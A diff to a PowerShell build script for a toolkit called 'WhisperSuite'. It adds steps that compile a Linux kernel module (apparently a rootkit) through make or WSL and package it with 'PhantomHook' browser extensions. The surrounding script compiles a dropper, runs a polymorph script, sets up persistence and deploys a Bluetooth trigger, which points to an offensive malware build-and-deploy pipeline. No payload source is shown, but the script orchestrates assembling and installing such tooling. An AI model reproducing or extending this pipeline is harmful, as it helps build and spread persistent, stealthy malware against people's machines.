@@ -29,7 +29,10 @@ $modulePaths = @(
     "Modules\Phase_Cleanse.ps1",
     "Modules\GhostResidency.ps1",
     "Modules\GhostSeal.ps1",
-    "Modules\ExorcistMode.ps1"
+    "Modules\ExorcistMode.ps1",
+    "Modules\GhostDesktop.ps1",
+    "Modules\GhostKernel.ps1",
+    "Modules\GhostBrowser.ps1"
 )
 
 function Compile-Projects {
@@ -73,6 +76,40 @@ function Embed-RavenPoem {
     }
 }
 
+function Build-GhostKernel {
+    Write-Host "[*] Building GhostKernel module..."
+    
+    # Check if we're on Linux/WSL for kernel module compilation
+    if ($IsLinux -or (Get-Command "wsl" -ErrorAction SilentlyContinue)) {
+        $kernelSource = Join-Path $baseDir "GhostKernel.c"
+        $makefile = Join-Path $baseDir "GhostKernel.mk"
+        
+        if (Test-Path $kernelSource) {
+            try {
+                if ($IsLinux) {
+                    # Direct Linux compilation
+                    & make -f $makefile all
+                } else {
+                    # Windows with WSL
+                    & wsl make -f $makefile all
+                }
+                
+                if ($LASTEXITCODE -eq 0) {
+                    Write-Host "[+] GhostKernel module compiled successfully"
+                } else {
+                    Write-Warning "[-] GhostKernel compilation failed"
+                }
+            } catch {
+                Write-Warning "[-] GhostKernel build error: $($_.Exception.Message)"
+            }
+        } else {
+            Write-Warning "[-] GhostKernel.c not found"
+        }
+    } else {
+        Write-Host "[i] Skipping GhostKernel build (Linux/WSL not available)"
+    }
+}
+
 function Prepare-Package {
     Write-Host "[*] Packaging WhisperSuite build..."
     New-Item -ItemType Directory -Path $finalPackage -Force | Out-Null
@@ -86,6 +123,31 @@ function Prepare-Package {
     Copy-Item $polymorphScript    (Join-Path $finalPackage "GhostPolymorph.ps1") -Force
     Copy-Item $bleConnectScript   (Join-Path $finalPackage "GhostBLEConnect_v2.ps1") -Force
     Copy-Item $bootstrapScript    (Join-Path $finalPackage "GhostWhisperBootstrap.ps1") -Force
+
+    # Copy kernel module if built
+    $kernelModule = Join-Path $baseDir "ghostkernel.ko"
+    if (Test-Path $kernelModule) {
+        Copy-Item $kernelModule (Join-Path $finalPackage "ghostkernel.ko") -Force
+        Write-Host "[+] GhostKernel module copied"
+    }
+    
+    # Copy kernel build files
+    $kernelMakefile = Join-Path $baseDir "GhostKernel.mk"
+    $kernelSource = Join-Path $baseDir "GhostKernel.c"
+    if (Test-Path $kernelMakefile) {
+        Copy-Item $kernelMakefile (Join-Path $finalPackage "GhostKernel.mk") -Force
+    }
+    if (Test-Path $kernelSource) {
+        Copy-Item $kernelSource (Join-Path $finalPackage "GhostKernel.c") -Force
+    }
+    
+    # Copy PhantomHook browser extensions
+    $phantomHookPath = Join-Path $baseDir "PhantomHook"
+    if (Test-Path $phantomHookPath) {
+        $browserDestination = Join-Path $finalPackage "PhantomHook"
+        Copy-Item $phantomHookPath $browserDestination -Recurse -Force
+        Write-Host "[+] PhantomHook browser extensions copied"
+    }
 
     # Modules
     foreach ($mod in $modulePaths) {
@@ -177,6 +239,7 @@ function Show-Deployment-Flow {
 Compile-Projects
 Compile-Dropper
 Embed-RavenPoem
+Build-GhostKernel
 Prepare-Package
 Setup-Persistence
 Deploy-BLETrigger
